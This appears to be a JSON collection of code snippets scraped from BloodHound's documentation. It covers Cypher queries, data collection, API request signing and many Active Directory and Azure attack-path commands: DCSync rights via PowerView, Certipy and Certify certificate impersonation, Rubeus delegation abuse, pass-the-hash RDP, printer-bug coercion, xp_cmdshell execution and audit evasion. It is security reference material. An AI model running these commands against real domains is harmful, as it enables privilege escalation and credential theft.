[
  {
    "owner": "specterops",
    "repo": "bloodhound",
    "content": "TITLE: Finding Shortest Paths to Domain Admins with Cypher in BloodHound\nDESCRIPTION: A Cypher query that calculates the shortest path from any User node to the Domain Admins group using any available relationship type. This is a fundamental query for identifying potential privilege escalation paths to domain admin access.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/analyze-data/bloodhound-gui/cypher-search.mdx#2025-04-23_snippet_2\n\nLANGUAGE: cypher\nCODE:\n```\nMATCH p=shortestPath((n:User)-[*1..]->(m:Group))WHERE m.name = \"DOMAIN ADMINS@INTERNAL.LOCAL\"RETURN p\n```\n\n----------------------------------------\n\nTITLE: Basic JSON Structure for BloodHound Data Ingestion\nDESCRIPTION: Demonstrates the basic JSON structure required for BloodHound data ingestion. It includes a 'data' array for collected objects and a 'meta' object with information about the collection method, object type, count, and format version.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/integrations/bloodhound-api/json-formats.mdx#2025-04-23_snippet_0\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"data\": [\n    {\n      [...]\n    }\n  ],\n  \"meta\": {\n    \"methods\": 127999,\n    \"type\": \"users\",\n    \"count\": 1,\n    \"version\": 5\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Exploiting WriteDacl on Domain Objects for DCSync Attack using PowerView\nDESCRIPTION: This command uses PowerView's Add-DomainObjectAcl to grant yourself DCSync rights on a domain, allowing you to extract password hashes for all domain users.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/resources/edges/write-dacl.mdx#2025-04-23_snippet_3\n\nLANGUAGE: powershell\nCODE:\n```\nAdd-DomainObjectAcl -TargetIdentity testlab.local -Rights DCSync\n```\n\n----------------------------------------\n\nTITLE: Requesting Malicious Certificate with Certipy (Linux)\nDESCRIPTION: Using Certipy on Linux to request enrollment in the affected certificate template, specifying the CA and target principal to impersonate.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/resources/edges/adcs-esc6a.mdx#2025-04-23_snippet_4\n\nLANGUAGE: bash\nCODE:\n```\ncertipy req -u john@corp.local -p Passw0rd -ca corp-DC-CA -target ca.corp.local -template ESC6 -upn administrator@corp.local\n```\n\n----------------------------------------\n\nTITLE: Executing SharpHound CE Data Collection in PowerShell\nDESCRIPTION: Command to run SharpHound CE collector with DCOnly collection method which collects Active Directory Structure Data and Certificate Services information. DCOnly is recommended as the starting collection method.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/collect-data/enterprise-collection/ad-hoc-collection.mdx#2025-04-23_snippet_0\n\nLANGUAGE: powershell\nCODE:\n```\n.\\SharpHound.exe -c DCOnly\n```\n\n----------------------------------------\n\nTITLE: Running SharpHound from Non-Domain System - User Impersonation\nDESCRIPTION: Command to create a new CMD shell with domain user credentials for non-domain joined collection.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/collect-data/ce-collection/sharphound.mdx#2025-04-23_snippet_3\n\nLANGUAGE: batch\nCODE:\n```\nC:\\> runas /netonly /user:CONTOSO\\Jeff.Dimmock cmd.exe\n```\n\n----------------------------------------\n\nTITLE: Running SharpHound in Stealth Mode for Session Collection\nDESCRIPTION: Command that enables stealth mode with session collection, which only targets systems most likely to have session data, reducing the footprint of the collection.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/collect-data/ce-collection/sharphound-flags.mdx#2025-04-23_snippet_2\n\nLANGUAGE: batch\nCODE:\n```\nC:\\> SharpHound.exe --CollectionMethods Session --Stealth\n```\n\n----------------------------------------\n\nTITLE: Running SharpHound Collector on Windows\nDESCRIPTION: Executes the SharpHound CE collector from a domain-joined Windows system to gather security data.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/get-started/quickstart/community-edition-quickstart.mdx#2025-04-23_snippet_10\n\nLANGUAGE: bash\nCODE:\n```\n# Run SharpHound CE\nC:\\> SharpHound.exe\n```\n\n----------------------------------------\n\nTITLE: Configuration Management Compliance Mapping Table\nDESCRIPTION: Markdown table showing how BloodHound Enterprise's identity and permission analysis capabilities map to configuration management requirements in NIST frameworks.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/manage-bloodhound/compliance-framework/resources.mdx#2025-04-23_snippet_2\n\nLANGUAGE: markdown\nCODE:\n```\n|     |     |     |     |     |     |     |\n| --- | --- | --- | --- | --- | --- | --- |\n| **Control Category/Activity** | **How Does BloodHound Enterprise Satisfy This Control?** | **[NIST CSF v1.1](/manage-bloodhound/compliance-framework/nist-csf-v1-1)** | **[NIST CSF v2](/manage-bloodhound/compliance-framework/nist-csf-v2)** | **[NIST 800-171](/manage-bloodhound/compliance-framework/nist-sp-800-171)** | **[NIST 800-53 rev 8](/manage-bloodhound/compliance-framework/nist-sp-800-53)** |     |\n```\n\n----------------------------------------\n\nTITLE: Enrolling Certificate as Victim (Linux)\nDESCRIPTION: Uses Certipy as the victim principal to request enrollment in the affected template, specifying the affected EnterpriseCA.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/resources/edges/adcs-esc9a.mdx#2025-04-23_snippet_10\n\nLANGUAGE: bash\nCODE:\n```\ncertipy req -u VICTIM@CORP.LOCAL -p PWD -ca CA-NAME -target SERVER -template TEMPLATE\n```\n\n----------------------------------------\n\nTITLE: Requesting TGT with Certipy (Linux)\nDESCRIPTION: This command requests a ticket granting ticket (TGT) from the domain using Certipy, specifying the certificate created in the previous step and the IP of a domain controller.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/resources/edges/adcs-esc1.mdx#2025-04-23_snippet_5\n\nLANGUAGE: bash\nCODE:\n```\ncertipy auth -pfx administrator.pfx -dc-ip 172.16.12\n```\n\n----------------------------------------\n\nTITLE: Requesting Certificate with Alternate Name Using Certify in Windows\nDESCRIPTION: Uses Certify tool to request a certificate with a Subject Alternate Name (SAN) to impersonate another principal. Targets a specific CA and template, allowing for authentication as the specified target principal.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/resources/edges/adcs-esc6b.mdx#2025-04-23_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\n.\\Certify.exe request /ca:rootdomaindc.forestroot.com\\forestroot-RootDomainDC-CA /template:ESC6 /altname:ForestRootDA\n```\n\n----------------------------------------\n\nTITLE: Executing S4U Attack with Rubeus\nDESCRIPTION: Uses Rubeus' S4U module to obtain a service ticket impersonating a domain user (admin) to access the target computer's CIFS service. The ticket is automatically injected into the current session for immediate use.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/resources/edges/allowed-to-act.mdx#2025-04-23_snippet_5\n\nLANGUAGE: bash\nCODE:\n```\nRubeus.exe s4u /user:attackersystem$ /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:admin /msdsspn:cifs/TARGETCOMPUTER.testlab.local /ptt\n```\n\n----------------------------------------\n\nTITLE: Configuring SharpHound Enterprise Settings\nDESCRIPTION: Example configuration file (settings.json) that defines service behavior, API connections, Active Directory settings, and logging preferences. Contains essential parameters for SharpHound Enterprise operation including REST endpoint configuration, logging levels, and collection settings.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/install-data-collector/install-sharphound/local-configuration.mdx#2025-04-23_snippet_0\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"RestEndpoint\": \"CODENAME.bloodhoundenterprise.io\",\n  \"RestPort\": 443,\n  \"SSL\": true,\n  \"CurrentJob\": null,\n  \"LogLevel\": \"Information\",\n  \"EnumerationLogLevel\": \"Information\",\n  \"TempDirectory\": \"C:\\\\\\Users\\\\\\gmsa_SHS$\\\\\\AppData\\\\\\Roaming\\\\\\BloodHoundEnterprise\",\n  \"Proxy\": null,\n  \"ComputerPasswordResetWindow\": 60,\n  \"ForceLDAPKerberosAuth\": true,\n  \"PortCheckTimeout\": 10000,\n  \"LDAPSSLPort\": 636,\n  \"LDAPPort\": 389,\n  \"ForceLDAPSSL\": false,\n  \"NumWorkers\": 50,\n  \"PartitionLDAPQueries\": true,\n  \"Version\": \"2.5.9.0\"\n}\n```\n\n----------------------------------------\n\nTITLE: Dependency Satisfaction Translation\nDESCRIPTION: Shows translation of queries with complex dependencies between multiple nodes, including boolean operations and property comparisons across different nodes.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/packages/go/cypher/models/pgsql/translate/README.md#2025-04-23_snippet_3\n\nLANGUAGE: postgresql\nCODE:\n```\nwith s0 as (select (n0.id, n0.kind_ids, n0.properties)::nodecomposite as n0\n            from node n0\n            where n0.kind_ids operator (pg_catalog.&&) array [1]::int2[]),\n     s1 as (select s0.n0 as n0, (n1.id, n1.kind_ids, n1.properties)::nodecomposite as n1\n            from s0,\n                 node n1\n            where n1.kind_ids operator (pg_catalog.&&) array [2]::int2[] and ((s0.n0).properties -> 'selected')::bool\n               or (s0.n0).properties -> 'tid' = n1.properties -> 'tid' and (n1.properties -> 'enabled')::bool)\nselect s1.n0 as s, s1.n1 as e\nfrom s1;\n```\n\n----------------------------------------\n\nTITLE: Requesting TGT with Impersonated Identity (Linux)\nDESCRIPTION: Use Certipy to request a ticket granting ticket (TGT) from the domain, specifying the target identity to impersonate and the PFX-formatted certificate in a Linux environment.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/resources/edges/adcs-esc3.mdx#2025-04-23_snippet_7\n\nLANGUAGE: bash\nCODE:\n```\ncertipy auth -pfx administrator.pfx -dc-ip 172.16.126.128\n```\n\n----------------------------------------\n\nTITLE: Abusing Constrained Delegation with Rubeus for Impersonation\nDESCRIPTION: This command uses Rubeus to exploit constrained delegation by requesting a TGT for the victim user and executing the S4U2self/S4U2proxy process to impersonate the admin user. It substitutes the alternative service name 'cifs' into the final service ticket to access the file system of the target computer.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/resources/edges/allowed-to-delegate.mdx#2025-04-23_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\nRubeus.exe s4u /user:victim /rc4:2b576acbe6bcfda7294d6bd18041b8fe /impersonateuser:admin /msdsspn:\"HTTP/PRIMARY.testlab.local\" /altservice:cifs /ptt\n```\n\n----------------------------------------\n\nTITLE: Checking Certificate Template Name Flags in PowerShell\nDESCRIPTION: PowerShell script to retrieve and decode msPKI-Certificate-Name-Flag values from a certificate template. Includes a comprehensive flag mapping table for interpretation.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/resources/edges/adcs-esc4.mdx#2025-04-23_snippet_12\n\nLANGUAGE: powershell\nCODE:\n```\n$templateName = \"TemplateName\" # Use CN, not display name\n\n# Find the certificate template\n$rootDSE = New-Object DirectoryServices.DirectoryEntry(\"LDAP://RootDSE\")\n$ldapPath = \"LDAP://CN=Certificate Templates,CN=Public Key Services,CN=Services,$($rootDSE.configurationNamingContext)\"\n$ldap = New-Object DirectoryServices.DirectoryEntry($ldapPath)\n$searcher = New-Object DirectoryServices.DirectorySearcher\n$searcher.SearchRoot = $ldap\n$searcher.Filter = \"(&(objectClass=pKICertificateTemplate)(cn=$templateName))\"\n$template = $searcher.FindOne().GetDirectoryEntry()\n$msPKICertificateNameFlag = $template.Properties[\"msPKI-Certificate-Name-Flag\"]\n$ldap.Close()\n\n# Print attribute value and enabeld flags\n$flagTable = @{\n0x00000001 = \"CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT\"\n0x00010000 = \"CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT_ALT_NAME\"\n0x00400000 = \"CT_FLAG_SUBJECT_ALT_REQUIRE_DOMAIN_DNS\"\n0x00800000 = \"CT_FLAG_SUBJECT_ALT_REQUIRE_SPN\"\n0x01000000 = \"CT_FLAG_SUBJECT_ALT_REQUIRE_DIRECTORY_GUID\"\n0x02000000 = \"CT_FLAG_SUBJECT_ALT_REQUIRE_UPN\"\n0x04000000 = \"CT_FLAG_SUBJECT_ALT_REQUIRE_EMAIL\"\n0x08000000 = \"CT_FLAG_SUBJECT_ALT_REQUIRE_DNS\"\n0x10000000 = \"CT_FLAG_SUBJECT_REQUIRE_DNS_AS_CN\"\n0x20000000 = \"CT_FLAG_SUBJECT_REQUIRE_EMAIL\"\n0x40000000 = \"CT_FLAG_SUBJECT_REQUIRE_COMMON_NAME\"\n0x80000000 = \"CT_FLAG_SUBJECT_REQUIRE_DIRECTORY_PATH\"\n0x00000008 = \"CT_FLAG_OLD_CERT_SUPPLIES_SUBJECT_AND_ALT_NAME\"\n}\nWrite-Host \"msPKI-Certificate-Name-Flag: $msPKICertificateNameFlag\"\nforeach ($flag in $flagTable.Keys) {\nif ($msPKICertificateNameFlag.ToString() -band $flag) {\nWrite-Host \"0x$(\"{0:X8}\" -f $flag) $($flagTable[$flag])\"\n}\n}\n```\n\n----------------------------------------\n\nTITLE: Setting Domain User Password with PowerView\nDESCRIPTION: Uses PowerView's Set-DomainUserPassword function to change a target user's password using previously created credentials and password objects.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/resources/edges/force-change-password.mdx#2025-04-23_snippet_2\n\nLANGUAGE: bash\nCODE:\n```\nSet-DomainUserPassword -Identity andy -AccountPassword $UserPassword -Credential $Cred\n```\n\n----------------------------------------\n\nTITLE: Requesting Certificate Enrollment with Certify (Windows)\nDESCRIPTION: This command uses Certify to request enrollment in the affected template, specifying the certification authority and target principal to impersonate.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/resources/edges/adcs-esc1.mdx#2025-04-23_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\nCertify.exe request /ca:rootdomaindc.forestroot.com\\forestroot-RootDomainDC-CA /template:\"ESC1\" /altname:ForestRootDA /sid:S-1-5-21-2697957641-2271029196-387917394-500\n```\n\n----------------------------------------\n\nTITLE: Downloading BloodHound CLI for Windows\nDESCRIPTION: PowerShell command to download the latest release of BloodHound CLI for Windows AMD64 architecture using curl.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/get-started/quickstart/community-edition-quickstart.mdx#2025-04-23_snippet_1\n\nLANGUAGE: powershell\nCODE:\n```\ncurl.exe -L -o \"$env:USERPROFILE\\Downloads\\bloodhound-cli-windows-amd64.zip\" https://github.com/SpecterOps/bloodhound-cli/releases/latest/download/bloodhound-cli-windows-amd64.zip\n```\n\n----------------------------------------\n\nTITLE: Collecting Users with JWT in AzureHound (JSON)\nDESCRIPTION: This command uses a JWT to authenticate and list all users in a specified tenant using AzureHound.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/collect-data/ce-collection/azurehound.mdx#2025-04-23_snippet_1\n\nLANGUAGE: json\nCODE:\n```\n./azurehound -j \"ey...\" list users --tenant \"contoso.onmicrosoft.com\"\n```\n\n----------------------------------------\n\nTITLE: Setting SPN of Victim Computer Using PowerView in Windows\nDESCRIPTION: This command uses PowerView to set the Service Principal Name (SPN) of the victim computer. This is a prerequisite step before changing the dNSHostName to avoid conflicts.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/resources/edges/adcs-esc10b.mdx#2025-04-23_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\nSet-DomainObject -Identity VICTIM -Set @{'serviceprincipalname'='HOST/victim'}\n```\n\n----------------------------------------\n\nTITLE: Defining Common Error Responses in YAML for OpenAPI Specification\nDESCRIPTION: This YAML snippet shows how to define common error responses in an OpenAPI specification. It includes references to reusable response definitions for various HTTP status codes, such as 400, 401, 403, 404, 429, and 500.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/packages/go/openapi/src/paths/README.md#2025-04-23_snippet_1\n\nLANGUAGE: yaml\nCODE:\n```\n400:\n  $ref: './../responses/bad-request.yaml'\n401:\n  $ref: './../responses/unauthorized.yaml'\n403:\n  $ref: './../responses/forbidden.yaml'\n404:\n  $ref: './../responses/not-found.yaml'\n429:\n  $ref: './../responses/too-many-requests.yaml'\n500:\n  $ref: './../responses/internal-server-error.yaml'\n```\n\n----------------------------------------\n\nTITLE: Requesting TGT with Rubeus in Windows\nDESCRIPTION: Uses Rubeus to request a TGT for the targeted principal using the forged certificate.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/resources/edges/golden-cert.mdx#2025-04-23_snippet_3\n\nLANGUAGE: Batch\nCODE:\n```\nRubeus.exe asktgt /user:Roshi /domain:dumpster.fire /certificate:target.pfx /password:NewPassword123!\n```\n\n----------------------------------------\n\nTITLE: Requesting Certificate with Alternate Name Using Certipy in Linux\nDESCRIPTION: Uses Certipy to request a certificate with a Subject Alternate Name (SAN) to impersonate another principal. Targets a specific CA and template, providing user credentials for authentication.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/resources/edges/adcs-esc6b.mdx#2025-04-23_snippet_4\n\nLANGUAGE: bash\nCODE:\n```\ncertipy req -u john@corp.local -p Passw0rd -ca corp-DC-CA -target ca.corp.local -template ESC6 -upn administrator@corp.local\n```\n\n----------------------------------------\n\nTITLE: Querying SQL Server Database Audit Specifications for OpSec Assessment\nDESCRIPTION: This SQL query retrieves detailed information about database audit specifications in SQL Server, including which database-level actions are being audited, to help attackers avoid detection.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/resources/edges/sql-admin.mdx#2025-04-23_snippet_17\n\nLANGUAGE: sql\nCODE:\n```\nSELECT a.audit_id,\na.name as audit_name,\ns.name as database\\_specification\\_name,\nd.audit\\_action\\_name,\nd.major_id,\nOBJECT_NAME(d.major_id) as object,\ns.is\\_state\\_enabled,\nd.is_group, s.create_date,\ns.modify_date,\nd.audited_result\nFROM sys.server_audits AS a\nJOIN sys.database\\_audit\\_specifications AS s\nON a.audit_guid = s.audit_guid\nJOIN sys.database\\_audit\\_specification_details AS d\nON s.database\\_specification\\_id = d.database\\_specification\\_id\n```\n\n----------------------------------------\n\nTITLE: Authenticating as Target Computer Using Certificate with Certipy in Linux\nDESCRIPTION: This command uses Certipy in Linux to perform Schannel authentication as the targeted principal against an affected Domain Controller using the issued certificate, providing an LDAP shell.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/resources/edges/adcs-esc10b.mdx#2025-04-23_snippet_16\n\nLANGUAGE: bash\nCODE:\n```\ncertipy auth -pfx TARGET.pfx -dc-ip IP -ldap-shell\n```\n\n----------------------------------------\n\nTITLE: Executing OS Commands via SQL Agent Jobs with CmdExec Subsystem in PowerUpSQL\nDESCRIPTION: This command creates and executes a SQL Agent job using the CmdExec subsystem to run operating system commands through PowerUpSQL's Invoke-SQLOSCmdAgentJob function.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/resources/edges/sql-admin.mdx#2025-04-23_snippet_3\n\nLANGUAGE: powershell\nCODE:\n```\nInvoke-SQLOSCmdAgentJob -Verbose -SubSystem CmdExec -Command \"echo hello > c:\\windows\\temp\\test1.txt\" -Instance sqlserver\\instance -username myuser -password mypassword\n```\n\n----------------------------------------\n\nTITLE: Downloading BloodHound CLI for Linux\nDESCRIPTION: Command to download the latest release of BloodHound CLI for Linux AMD64 architecture using wget.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/get-started/quickstart/community-edition-quickstart.mdx#2025-04-23_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\nwget https://github.com/SpecterOps/bloodhound-cli/releases/latest/download/bloodhound-cli-linux-amd64.tar.gz\n```\n\n----------------------------------------\n\nTITLE: Using Regex for Wildcard Searches in BloodHound Cypher Queries\nDESCRIPTION: A Cypher query that uses regular expressions to perform case-insensitive wildcard searches on node names, limiting results to 10 items. This is the query used when typing in the BloodHound search bar.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/analyze-data/bloodhound-gui/cypher-search.mdx#2025-04-23_snippet_3\n\nLANGUAGE: cypher\nCODE:\n```\nMATCH (n)WHERE n.name =~ \"(?i).*searchterm.*\"RETURN nLIMIT 10\n```\n\n----------------------------------------\n\nTITLE: Property Mutation in Cypher\nDESCRIPTION: These Cypher queries show property mutation operations, which are filtered by default in the AST filter for sanitizing potentially dangerous openCypher language constructs.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/packages/go/cypher/README.md#2025-04-23_snippet_26\n\nLANGUAGE: cypher\nCODE:\n```\nMATCH (V:Label) SET V.Name = 'new name';\nMATCH (V:Label) REMOVE V.Name;\n\nMATCH ()-[E:EdgeLabel]->() SET E.Name = 'new name';\nMATCH ()-[E:EdgeLabel]->() REMOVE E.Name;\n```\n\n----------------------------------------\n\nTITLE: Creating PSCredential Object for Password Reset\nDESCRIPTION: Creates a PowerShell credential object using a plaintext password for authentication. This is used to establish credentials for the user with ForceChangePassword privileges.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/resources/edges/force-change-password.mdx#2025-04-23_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\n$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force\n$Cred = New-Object System.Management.Automation.PSCredential('CONTOSO\\\\dfm.a', $SecPassword)\n```\n\n----------------------------------------\n\nTITLE: Issuing Certificate Request for Another User (Windows)\nDESCRIPTION: Use Certify with the enrollment agent certificate to issue a certificate request on behalf of another user.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/resources/edges/adcs-esc3.mdx#2025-04-23_snippet_2\n\nLANGUAGE: bash\nCODE:\n```\nCertify.exe request /ca:CORPDC01.CORP.LOCAL\\CORP-CORPDC01-CA /template:User /onbehalfof:CORP\\itadmin /enrollcert:enrollmentcert.pfx\n```\n\n----------------------------------------\n\nTITLE: Converting Hex-encoded Password to NT Hash\nDESCRIPTION: Python script that converts a hex-encoded sMSA password to its corresponding NT hash format using MD4 hashing.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/resources/edges/dump-smsa-password.mdx#2025-04-23_snippet_1\n\nLANGUAGE: bash\nCODE:\n```\n# nt.py\nimport sys, hashlib\n\npw_hex = sys.argv[1]\nnt_hash = hashlib.new('md4', bytes.fromhex(pw_hex)).hexdigest()\n\nprint(nt_hash)\n```\n\n----------------------------------------\n\nTITLE: Executing OS Commands via SQL Server xp_cmdshell with PowerUpSQL\nDESCRIPTION: This command executes operating system commands through SQL Server using the xp_cmdshell extended stored procedure via PowerUpSQL's Invoke-SQLOSCmd function with multithreading.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/resources/edges/sql-admin.mdx#2025-04-23_snippet_2\n\nLANGUAGE: powershell\nCODE:\n```\nInvoke-SQLOSCmd -Verbose -Command \"Whoami\" -Threads 10 -Instance sqlserver\\instance\n```\n\n----------------------------------------\n\nTITLE: Forging Certificate with Certipy in Linux\nDESCRIPTION: Uses Certipy to forge a certificate for a target principal using the backed-up CA certificate.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/resources/edges/golden-cert.mdx#2025-04-23_snippet_5\n\nLANGUAGE: Bash\nCODE:\n```\ncertipy forge -ca-pfx dumpster-DC01-CA.pfx -upn Roshi@dumpster.fire -subject 'CN=Roshi,OU=Users,OU=Tier0,DC=dumpster,DC=fire\n```\n\n----------------------------------------\n\nTITLE: Extracting JSON Web Token (JWT) from Azure Managed Identity using PowerShell\nDESCRIPTION: This PowerShell script extracts a JWT for a Managed Identity Service Principal by accessing the MSI endpoint. The token can be used to authenticate to Microsoft Graph APIs outside the scope of the Azure RM resource.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/resources/edges/az-managed-identity.mdx#2025-04-23_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\n$tokenAuthURI = $env:MSI_ENDPOINT + \"?resource=https://graph.microsoft.com/&api-version=2017-09-01\"\n$tokenResponse = Invoke-RestMethod -Method Get -Headers @{\"Secret\"=\"$env:MSI_SECRET\"} -Uri $tokenAuthURI\n$tokenResponse.access_token\n```\n\n----------------------------------------\n\nTITLE: Downloading BloodHound CLI for Mac\nDESCRIPTION: Command to download the latest release of BloodHound CLI for Mac ARM64 architecture using curl.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/get-started/quickstart/community-edition-quickstart.mdx#2025-04-23_snippet_2\n\nLANGUAGE: bash\nCODE:\n```\ncurl -L -o bloodhound-cli-darwin-arm64.tar.gz https://github.com/SpecterOps/bloodhound-cli/releases/latest/download/bloodhound-cli-darwin-arm64.tar.gz\n```\n\n----------------------------------------\n\nTITLE: Python Implementation for BloodHound API HMAC Authentication\nDESCRIPTION: A Python function demonstrating the full implementation of HMAC-SHA-256 authentication for the BloodHound API. It creates a signature chain that includes the request method, URI, timestamp, and body content to prevent replay attacks and content modification.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/integrations/bloodhound-api/working-with-api.mdx#2025-04-23_snippet_2\n\nLANGUAGE: python\nCODE:\n```\ndef_request(self, method: str, uri: str, body: Optional[bytes] = None) -> requests.Response:\n    # Digester is initialized with HMAC-SHA-256 using the token key as the HMAC digest key.\n    digester = hmac.new(self._credentials.token_key.encode(), None, hashlib.sha256)\n\n    # OperationKey is the first HMAC digest link in the signature chain. This prevents replay attacks that seek to\n    # modify the request method or URI. It is composed of concatenating the request method and the request URI with\n    # no delimiter and computing the HMAC digest using the token key as the digest secret.\n    #\n    # Example: GET /api/v2/test/resource HTTP/1.1\n    # Signature Component: GET/api/v2/test/resource\n    digester.update(f'{method}{uri}'.encode())\n\n    # Update the digester for further chaining\n    digester = hmac.new(digester.digest(), None, hashlib.sha256)\n\n    # DateKey is the next HMAC digest link in the signature chain. This encodes the RFC3339 formatted datetime\n    # value as part of the signature to the hour to prevent replay attacks that are older than max two hours. This\n    # value is added to the signature chain by cutting off all values from the RFC3339 formatted datetime from the\n    # hours value forward:\n    #\n    # Example: 2020-12-01T23:59:60Z\n    # Signature Component: 2020-12-01T23\n    datetime_formatted = datetime.datetime.now().astimezone().isoformat('T')\n    digester.update(datetime_formatted[:13].encode())\n\n    # Update the digester for further chaining\n    digester = hmac.new(digester.digest(), None, hashlib.sha256)\n\n    # Body signing is the last HMAC digest link in the signature chain. This encodes the request body as part of\n    # the signature to prevent replay attacks that seek to modify the payload of a signed request. In the case\n    # where there is no body content the HMAC digest is computed anyway, simply with no values written to the\n    # digester.\n    ifbodyisnotNone:\n        digester.update(body)\n\n    # Perform the request with the signed and expected headers\n    return requests.request(\n        method=method,\n        url=self._format_url(uri),\n        headers={\n            'User-Agent': 'bhe-python-sdk 0001',\n            'Authorization': f'bhesignature {self._credentials.token_id}',\n            'RequestDate': datetime_formatted,\n            'Signature': base64.b64encode(digester.digest()),\n            'Content-Type': 'application/json',\n        },\n        data=body,\n    )\n```\n\n----------------------------------------\n\nTITLE: Coercing DC Authentication using printerbug.py in Linux\nDESCRIPTION: This command uses printerbug.py to coerce a target Domain Controller to authenticate to a compromised computer using the printspooler service from a Linux environment.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/resources/edges/coerce-to-tgt.mdx#2025-04-23_snippet_3\n\nLANGUAGE: bash\nCODE:\n```\nprinterbug.py '<domain>/<username>:<password>'@<target DC IP> <compromised computer IP>\n```\n\n----------------------------------------\n\nTITLE: Exploiting RDP Access with Password Hash and Non-Interactive Access using xfreerdp\nDESCRIPTION: This command performs a pass-the-hash attack with xfreerdp to establish a Remote Desktop connection. The target computer must allow Restricted Admin Mode, and the method requires network access to the target.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/resources/edges/can-rdp.mdx#2025-04-23_snippet_2\n\nLANGUAGE: bash\nCODE:\n```\nproxychains xfreerdp /pth:<ntlm hash> /u:dfm /d:testlab.local /v:<computer ip>\n```\n\n----------------------------------------\n\nTITLE: Generating Signed Requests for BloodHound API in Python\nDESCRIPTION: Pseudo-code demonstrating the process of creating signed requests for the BloodHound API using Python. It includes steps for initializing the HMAC digest, creating the OperationKey and DateKey, and handling body signing.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/reference/overview.mdx#2025-04-23_snippet_2\n\nLANGUAGE: python\nCODE:\n```\ndigester = hmac.new(sha256, api_token_key)\n\n# OperationKey\ndigester.write(request_method + request_uri)\ndigester = hmac.New(sha256, digester.hash())\n\n# DateKey\nrequest_datetime = date.now()\ndigester.write(request_datetime[:13])\ndigester = hmac.New(sha256, digester.hash())\n\n# Body signing\nif request.body is not empty:\n    digester.write(request.body)\n\n# Finalizing and setting headers\nencoded_hash = base64_encode(digester.hash())\nrequest.header.write('Authorization', 'bhesignature ' + token_id)\nrequest.header.write('RequestDate', request_datetime)\nrequest.header.write('Signature', encoded_hash)\n```\n\n----------------------------------------\n\nTITLE: Initial Pathspace Population Query in PostgreSQL\nDESCRIPTION: Primer query that establishes the initial pathspace for pattern expansion by joining edge and node tables.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/packages/go/cypher/models/pgsql/translate/README.md#2025-04-23_snippet_5\n\nLANGUAGE: postgresql\nCODE:\n```\nselect e0.start_id,\n       e0.end_id,\n       1,\n       false,\n       e0.start_id = e0.end_id,\n       array [e0.id]\nfrom edge e0\n         join node n0 on n0.id = e0.start_id\n         join node n1 on n1.id = e0.end_id\n```\n\n----------------------------------------\n\nTITLE: Acquiring MS Graph Token with BARK\nDESCRIPTION: Uses BARK's Get-MSGraphTokenWithClientCredentials function to obtain an MS Graph-scoped JWT using Service Principal credentials.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/resources/edges/az-mg-add-member.mdx#2025-04-23_snippet_0\n\nLANGUAGE: powershell\nCODE:\n```\n$MGToken = Get-MSGraphTokenWithClientCredentials `\n    -ClientID \"34c7f844-b6d7-47f3-b1b8-720e0ecba49c\" `\n    -ClientSecret \"asdf...\" `\n    -TenantName \"contoso.onmicrosoft.com\"\n```\n\n----------------------------------------\n\nTITLE: Converting Certificate to PFX Format in Windows\nDESCRIPTION: Converts the obtained certificate from PEM format to PFX format which is required for Kerberos authentication with the certificate.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/resources/edges/adcs-esc9b.mdx#2025-04-23_snippet_5\n\nLANGUAGE: bash\nCODE:\n```\ncertutil.exe -MergePFX .\\cert.pem 